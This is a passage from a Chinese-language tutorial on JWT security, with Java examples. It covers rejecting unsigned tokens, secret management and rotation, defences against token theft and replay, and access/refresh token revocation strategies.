</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a><span class="w">    </span><span class="n">Header</span><span class="w"> </span><span class="n">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseHeader</span><span class="p">(</span><span class="n">jwt</span><span class="p">);</span>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;none&quot;</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="na">getAlg</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&quot;Unsigned JWT not allowed&quot;</span><span class="p">);</span>
</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#__codelineno-81-7"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#__codelineno-81-8"></a>
</span><span id="__span-81-9"><a id="__codelineno-81-9" name="__codelineno-81-9" href="#__codelineno-81-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">verify</span><span class="p">(</span><span class="n">jwt</span><span class="p">);</span>
</span><span id="__span-81-10"><a id="__codelineno-81-10" name="__codelineno-81-10" href="#__codelineno-81-10"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>问题3：密钥泄露</strong></p>
<p><strong>风险场景：</strong>
- 密钥硬编码在源代码中
- 密钥提交到Git仓库
- 密钥通过日志泄露
- 密钥权限管理不当</p>
<p><strong>最佳实践：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="c1">// ❌ 错误：硬编码密钥</span>
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">SECRET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;my-secret-key-123&quot;</span><span class="p">;</span>
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a><span class="c1">// ✅ 正确：从环境变量读取</span>
</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getenv</span><span class="p">(</span><span class="s">&quot;JWT_SECRET&quot;</span><span class="p">);</span>
</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>
</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7" href="#__codelineno-82-7"></a><span class="c1">// ✅ 更好：从密钥管理服务读取</span>
</span><span id="__span-82-8"><a id="__codelineno-82-8" name="__codelineno-82-8" href="#__codelineno-82-8"></a><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyManagementService</span><span class="p">.</span><span class="na">getSecret</span><span class="p">(</span><span class="s">&quot;jwt-secret&quot;</span><span class="p">);</span>
</span><span id="__span-82-9"><a id="__codelineno-82-9" name="__codelineno-82-9" href="#__codelineno-82-9"></a>
</span><span id="__span-82-10"><a id="__codelineno-82-10" name="__codelineno-82-10" href="#__codelineno-82-10"></a><span class="c1">// ✅ 最佳：定期轮换密钥</span>
</span><span id="__span-82-11"><a id="__codelineno-82-11" name="__codelineno-82-11" href="#__codelineno-82-11"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">KeyRotationService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-82-12"><a id="__codelineno-82-12" name="__codelineno-82-12" href="#__codelineno-82-12"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">SecretKey</span><span class="o">&gt;</span><span class="w"> </span><span class="n">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
</span><span id="__span-82-13"><a id="__codelineno-82-13" name="__codelineno-82-13" href="#__codelineno-82-13"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">currentKeyId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;key-2024-01&quot;</span><span class="p">;</span>
</span><span id="__span-82-14"><a id="__codelineno-82-14" name="__codelineno-82-14" href="#__codelineno-82-14"></a>
</span><span id="__span-82-15"><a id="__codelineno-82-15" name="__codelineno-82-15" href="#__codelineno-82-15"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sign</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-82-16"><a id="__codelineno-82-16" name="__codelineno-82-16" href="#__codelineno-82-16"></a><span class="w">        </span><span class="n">SecretKey</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keys</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">currentKeyId</span><span class="p">);</span>
</span><span id="__span-82-17"><a id="__codelineno-82-17" name="__codelineno-82-17" href="#__codelineno-82-17"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">HMAC</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span>
</span><span id="__span-82-18"><a id="__codelineno-82-18" name="__codelineno-82-18" href="#__codelineno-82-18"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-82-19"><a id="__codelineno-82-19" name="__codelineno-82-19" href="#__codelineno-82-19"></a>
</span><span id="__span-82-20"><a id="__codelineno-82-20" name="__codelineno-82-20" href="#__codelineno-82-20"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verify</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">keyId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-82-21"><a id="__codelineno-82-21" name="__codelineno-82-21" href="#__codelineno-82-21"></a><span class="w">        </span><span class="n">SecretKey</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keys</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">keyId</span><span class="p">);</span><span class="w">  </span><span class="c1">// 支持旧密钥验证</span>
</span><span id="__span-82-22"><a id="__codelineno-82-22" name="__codelineno-82-22" href="#__codelineno-82-22"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">HMAC</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">signature</span><span class="p">);</span>
</span><span id="__span-82-23"><a id="__codelineno-82-23" name="__codelineno-82-23" href="#__codelineno-82-23"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-82-24"><a id="__codelineno-82-24" name="__codelineno-82-24" href="#__codelineno-82-24"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>问题4：Token被窃取</strong></p>
<p><strong>攻击场景：</strong>
- XSS攻击窃取localStorage中的Token
- 中间人攻击拦截HTTP传输
- 恶意软件窃取</p>
<p><strong>防护措施：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>1. 使用HTTPS（防中间人）
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>   ✅ 所有API必须HTTPS
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>   ✅ 启用HSTS头
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a>
</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a>2. HttpOnly Cookie存储（防XSS）
</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a>   ✅ Token存储在HttpOnly Cookie中
</span><span id="__span-83-7"><a id="__codelineno-83-7" name="__codelineno-83-7" href="#__codelineno-83-7"></a>   ❌ 不要存储在localStorage
</span><span id="__span-83-8"><a id="__codelineno-83-8" name="__codelineno-83-8" href="#__codelineno-83-8"></a>
</span><span id="__span-83-9"><a id="__codelineno-83-9" name="__codelineno-83-9" href="#__codelineno-83-9"></a>3. 短期Token + Refresh Token
</span><span id="__span-83-10"><a id="__codelineno-83-10" name="__codelineno-83-10" href="#__codelineno-83-10"></a>   ✅ Access Token: 15分钟
</span><span id="__span-83-11"><a id="__codelineno-83-11" name="__codelineno-83-11" href="#__codelineno-83-11"></a>   ✅ Refresh Token: 7天，存储在安全Cookie
</span><span id="__span-83-12"><a id="__codelineno-83-12" name="__codelineno-83-12" href="#__codelineno-83-12"></a>
</span><span id="__span-83-13"><a id="__codelineno-83-13" name="__codelineno-83-13" href="#__codelineno-83-13"></a>4. Token Binding（高级）
</span><span id="__span-83-14"><a id="__codelineno-83-14" name="__codelineno-83-14" href="#__codelineno-83-14"></a>   ✅ 将Token绑定到TLS连接
</span><span id="__span-83-15"><a id="__codelineno-83-15" name="__codelineno-83-15" href="#__codelineno-83-15"></a>   ✅ 防止Token被复制使用
</span></code></pre></div></p>
<p><strong>问题5：重放攻击（Replay Attack）</strong></p>
<p><strong>攻击原理：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>1. 攻击者截获有效的JWT
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>2. 在Token过期前重复使用
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>3. 即使用户已登出，Token仍然有效
</span></code></pre></div></p>
<p><strong>防护措施：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="c1">// 方案1：使用jti（JWT ID）+ 黑名单</span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="w">    </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseToken</span><span class="p">(</span><span class="n">jwt</span><span class="p">);</span>
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">jti</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getJti</span><span class="p">();</span>
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a>
</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a><span class="w">    </span><span class="c1">// 检查是否在黑名单中</span>
</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">blacklist</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">jti</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-85-8"><a id="__codelineno-85-8" name="__codelineno-85-8" href="#__codelineno-85-8"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenRevokedException</span><span class="p">();</span>
</span><span id="__span-85-9"><a id="__codelineno-85-9" name="__codelineno-85-9" href="#__codelineno-85-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-85-10"><a id="__codelineno-85-10" name="__codelineno-85-10" href="#__codelineno-85-10"></a>
</span><span id="__span-85-11"><a id="__codelineno-85-11" name="__codelineno-85-11" href="#__codelineno-85-11"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-85-12"><a id="__codelineno-85-12" name="__codelineno-85-12" href="#__codelineno-85-12"></a><span class="p">}</span>
</span><span id="__span-85-13"><a id="__codelineno-85-13" name="__codelineno-85-13" href="#__codelineno-85-13"></a>
</span><span id="__span-85-14"><a id="__codelineno-85-14" name="__codelineno-85-14" href="#__codelineno-85-14"></a><span class="c1">// 登出时将jti加入黑名单</span>
</span><span id="__span-85-15"><a id="__codelineno-85-15" name="__codelineno-85-15" href="#__codelineno-85-15"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">logout</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-85-16"><a id="__codelineno-85-16" name="__codelineno-85-16" href="#__codelineno-85-16"></a><span class="w">    </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseToken</span><span class="p">(</span><span class="n">jwt</span><span class="p">);</span>
</span><span id="__span-85-17"><a id="__codelineno-85-17" name="__codelineno-85-17" href="#__codelineno-85-17"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">jti</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getJti</span><span class="p">();</span>
</span><span id="__span-85-18"><a id="__codelineno-85-18" name="__codelineno-85-18" href="#__codelineno-85-18"></a><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">exp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getExp</span><span class="p">();</span>
</span><span id="__span-85-19"><a id="__codelineno-85-19" name="__codelineno-85-19" href="#__codelineno-85-19"></a>
</span><span id="__span-85-20"><a id="__codelineno-85-20" name="__codelineno-85-20" href="#__codelineno-85-20"></a><span class="w">    </span><span class="c1">// 添加到黑名单，设置TTL为Token剩余时间</span>
</span><span id="__span-85-21"><a id="__codelineno-85-21" name="__codelineno-85-21" href="#__codelineno-85-21"></a><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">1000</span><span class="p">);</span>
</span><span id="__span-85-22"><a id="__codelineno-85-22" name="__codelineno-85-22" href="#__codelineno-85-22"></a><span class="w">    </span><span class="n">blacklist</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">jti</span><span class="p">,</span><span class="w"> </span><span class="n">ttl</span><span class="p">);</span>
</span><span id="__span-85-23"><a id="__codelineno-85-23" name="__codelineno-85-23" href="#__codelineno-85-23"></a><span class="p">}</span>
</span><span id="__span-85-24"><a id="__codelineno-85-24" name="__codelineno-85-24" href="#__codelineno-85-24"></a>
</span><span id="__span-85-25"><a id="__codelineno-85-25" name="__codelineno-85-25" href="#__codelineno-85-25"></a><span class="c1">// 方案2：使用nonce（一次性随机数）</span>
</span><span id="__span-85-26"><a id="__codelineno-85-26" name="__codelineno-85-26" href="#__codelineno-85-26"></a><span class="p">{</span>
</span><span id="__span-85-27"><a id="__codelineno-85-27" name="__codelineno-85-27" href="#__codelineno-85-27"></a><span class="w">  </span><span class="s">&quot;jti&quot;</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;unique-id-123&quot;</span><span class="p">,</span>
</span><span id="__span-85-28"><a id="__codelineno-85-28" name="__codelineno-85-28" href="#__codelineno-85-28"></a><span class="w">  </span><span class="s">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;random-nonce-xyz&quot;</span><span class="p">,</span>
</span><span id="__span-85-29"><a id="__codelineno-85-29" name="__codelineno-85-29" href="#__codelineno-85-29"></a><span class="w">  </span><span class="s">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735686000</span>
</span><span id="__span-85-30"><a id="__codelineno-85-30" name="__codelineno-85-30" href="#__codelineno-85-30"></a><span class="p">}</span>
</span><span id="__span-85-31"><a id="__codelineno-85-31" name="__codelineno-85-31" href="#__codelineno-85-31"></a>
</span><span id="__span-85-32"><a id="__codelineno-85-32" name="__codelineno-85-32" href="#__codelineno-85-32"></a><span class="c1">// 方案3：短期Token（最简单）</span>
</span><span id="__span-85-33"><a id="__codelineno-85-33" name="__codelineno-85-33" href="#__codelineno-85-33"></a><span class="c1">// Access Token: 5-15分钟</span>
</span><span id="__span-85-34"><a id="__codelineno-85-34" name="__codelineno-85-34" href="#__codelineno-85-34"></a><span class="c1">// 即使被窃取，影响时间也很短</span>
</span></code></pre></div></p>
<h4 id="token撤销策略">Token撤销策略<a class="headerlink" href="#token撤销策略" title="链接到此标题">&para;</a></h4>
<p>**问题：**JWT无状态的特性导致无法主动撤销</p>
<p><strong>解决方案对比：</strong></p>
<table>
<thead>
<tr>
<th>方案</th>
<th>实现方式</th>
<th>优点</th>
<th>缺点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>黑名单</strong></td>
<td>Redis存储已撤销的jti</td>
<td>精确控制</td>
<td>失去无状态优势</td>
<td>中等安全要求</td>
</tr>
<tr>
<td><strong>白名单</strong></td>
<td>Redis存储有效的jti</td>
<td>安全性最高</td>
<td>类似Session，失去JWT优势</td>
<td>高安全要求</td>
</tr>
<tr>
<td><strong>短期Token</strong></td>
<td>设置短过期时间</td>
<td>保持无状态</td>
<td>用户体验差（频繁刷新）</td>
<td>低安全要求</td>
</tr>
<tr>
<td><strong>Refresh Token</strong></td>
<td>Access Token短期 + Refresh Token长期</td>
<td>平衡安全和体验</td>
<td>实现复杂</td>
<td><strong>推荐方案</strong></td>
</tr>
<tr>
<td><strong>版本号</strong></td>
<td>Payload中存储tokenVersion</td>
<td>简单</td>
<td>需要查询数据库</td>
<td>简单场景</td>
</tr>
</tbody>
</table>
<p><strong>推荐方案：Access Token + Refresh Token</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>架构设计：
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>
</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>Access Token（访问令牌）：
</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>- 用途：访问受保护资源
</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a>- 有效期：短（5-15分钟）
</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a>- 存储位置：内存或HttpOnly Cookie
</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a>- 是否可撤销：不可（但很快过期）
</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a>
</span><span id="__span-86-9"><a id="__codelineno-86-9" name="__codelineno-86-9" href="#__codelineno-86-9"></a>Refresh Token（刷新令牌）：
</span><span id="__span-86-10"><a id="__codelineno-86-10" name="__codelineno-86-10" href="#__codelineno-86-10"></a>- 用途：获取新的Access Token
</span><span id="__span-86-11"><a id="__codelineno-86-11" name="__codelineno-86-11" href="#__codelineno-86-11"></a>- 有效期：长（7-30天）
</span><span id="__span-86-12"><a id="__codelineno-86-12" name="__codelineno-86-12" href="#__codelineno-86-12"></a>- 存储位置：HttpOnly Cookie或安全存储
</span><span id="__span-86-13"><a id="__codelineno-86-13" name="__codelineno-86-13" href="#__codelineno-86-13"></a>- 是否可撤销：可以（存储在数据库）
</span><span id="__span-86-14"><a id="__codelineno-86-14" name="__codelineno-86-14" href="#__codelineno-86-14"></a>
</span><span id="__span-86-15"><a id="__codelineno-86-15" name="__codelineno-86-15" href="#__codelineno-86-15"></a>流程：
</span><span id="__span-86-16"><a id="__codelineno-86-16" name="__codelineno-86-16" href="#__codelineno-86-16"></a>1. 登录 → 返回Access Token + Refresh Token
</span><span id="__span-86-17"><a id="__codelineno-86-17" name="__codelineno-86-17" href="#__codelineno-86-17"></a>2. 访问API → 使用Access Token
</span><span id="__span-86-18"><a id="__codelineno-86-18" name="__codelineno-86-18" href="#__codelineno-86-18"></a>3. Access Token过期 → 使用Refresh Token获取新的Access Token
</span><span id="__span-86-19"><a id="__codelineno-86-19" name="__codelineno-86-19" href="#__codelineno-86-19"></a>4. Refresh Token过期 → 重新登录
</span><span id="__span-86-20"><a id="__codelineno-86-20" name="__codelineno-86-20" href="#__codelineno-86-20"></a>5. 登出 → 撤销Refresh Token（数据库删除）
</span></code></pre></div>
<p><strong>实现示例：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="cm">/**</span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a><span class="cm"> * Token刷新流程</span>
</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a><span class="cm"> */</span>
</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a><span class="kd">public</span><span class="w"> </span><span class="n">TokenPair</span><span class="w"> </span><span class="nf">refreshToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">refreshToken</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a><span class="w">    </span><span class="c1">// 1. 验证Refresh Token</span>
</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a><span class="w">    </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">validateToken</span><span class="p">(</span><span class="n">refreshToken</span><span class="p">);</span>
</span><span id="__span-87-7"><a id="__codelineno-87-7" name="__codelineno-87-7" href="#__codelineno-87-7"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getSubject</span><span class="p">();</span>
</span><span id="__span-87-8"><a id="__codelineno-87-8" name="__codelineno-87-8" href="#__codelineno-87-8"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">tokenId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getJti</span><span class="p">();</span>
</span><span id="__span-87-9"><a id="__codelineno-87-9" name="__codelineno-87-9" href="#__codelineno-87-9"></a>
</span><span id="__span-87-10"><a id="__codelineno-87-10" name="__codelineno-87-10" href="#__codelineno-87-10"></a><span class="w">    </span><span class="c1">// 2. 检查Refresh Token是否在数据库中（未被撤销）</span>
</span><span id="__span-87-11"><a id="__codelineno-87-11" name="__codelineno-87-11" href="#__codelineno-87-11"></a><span class="w">    </span><span class="n">RefreshTokenEntity</span><span class="w"> </span><span class="n">entity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">refreshTokenRepository</span>
</span><span id="__span-87-12"><a id="__codelineno-87-12" name="__codelineno-87-12" href="#__codelineno-87-12"></a><span class="w">        </span><span class="p">.</span><span class="na">findByUserIdAndTokenId</span><span class="p">(</span><span class="n">userId</span><span class="p">,</span><span class="w"> </span><span class="n">tokenId</span><span class="p">);</span>
</span><span id="__span-87-13"><a id="__codelineno-87-13" name="__codelineno-87-13" href="#__codelineno-87-13"></a>
</span><span id="__span-87-14"><a id="__codelineno-87-14" name="__codelineno-87-14" href="#__codelineno-87-14"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">entity</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">entity</span><span class="p">.</span><span class="na">isRevoked</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-87-15"><a id="__codelineno-87-15" name="__codelineno-87-15" href="#__codelineno-87-15"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidRefreshTokenException</span><span class="p">();</span>
</span><span id="__span-87-16"><a id="__codelineno-87-16" name="__codelineno-87-16" href="#__codelineno-87-16"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-87-17"><a id="__codelineno-87-17" name="__codelineno-87-17" href="#__codelineno-87-17"></a>
</span><span id="__span-87-18"><a id="__codelineno-87-18" name="__codelineno-87-18" href="#__codelineno-87-18"></a><span class="w">    </span><span class="c1">// 3. 生成新的Access Token（短期）</span>
</span><span id="__span-87-19"><a id="__codelineno-87-19" name="__codelineno-87-19" href="#__codelineno-87-19"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">newAccessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">generateAccessToken</span><span class="p">(</span>
</span><span id="__span-87-20"><a id="__codelineno-87-20" name="__codelineno-87-20" href="#__codelineno-87-20"></a><span class="w">        </span><span class="n">userId</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-87-21"><a id="__codelineno-87-21" name="__codelineno-87-21" href="#__codelineno-87-21"></a><span class="w">        </span><span class="n">Duration</span><span class="p">.</span><span class="na">ofMinutes</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span><span id="__span-87-22"><a id="__codelineno-87-22" name="__codelineno-87-22" href="#__codelineno-87-22"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-87-23"><a id="__codelineno-87-23" name="__codelineno-87-23" href="#__codelineno-87-23"></a>
</span><span id="__span-87-24"><a id="__codelineno-87-24" name="__codelineno-87-24" href="#__codelineno-87-24"></a><span class="w">    </span><span class="c1">// 4. 可选：轮换Refresh Token（更安全）</span>
</span><span id="__span-87-25"><a id="__codelineno-87-25" name="__codelineno-87-25" href="#__codelineno-87-25"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">newRefreshToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">generateRefreshToken</span><span class="p">(</span>
</span><span id="__span-87-26"><a id="__codelineno-87-26" name="__codelineno-87-26" href="#__codelineno-87-26"></a><span class="w">        </span><span class="n">userId</span><span class="p">,</span>
</span><span id="__span-87-27"><a id="__codelineno-87-27" name="__codelineno-87-27" href="#__codelineno-87-27"></a><span class="w">        </span><span class="n">Duration</span><span class="p">.</span><span class="na">ofDays</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span id="__span-87-28"><a id="__codelineno-87-28" name="__codelineno-87-28" href="#__codelineno-87-28"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-87-29"><a id="__codelineno-87-29" name="__codelineno-87-29" href="#__codelineno-87-29"></a>
</span><span id="__span-87-30"><a id="__codelineno-87-30" name="__codelineno-87-30" href="#__codelineno-87-30"></a><span class="w">    </span><span class="c1">// 撤销旧Refresh Token</span>
</span><span id="__span-87-31"><a id="__codelineno-87-31" name="__codelineno-87-31" href="#__codelineno-87-31"></a><span class="w">    </span><span class="n">entity</span><span class="p">.</span><span class="na">setRevoked</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
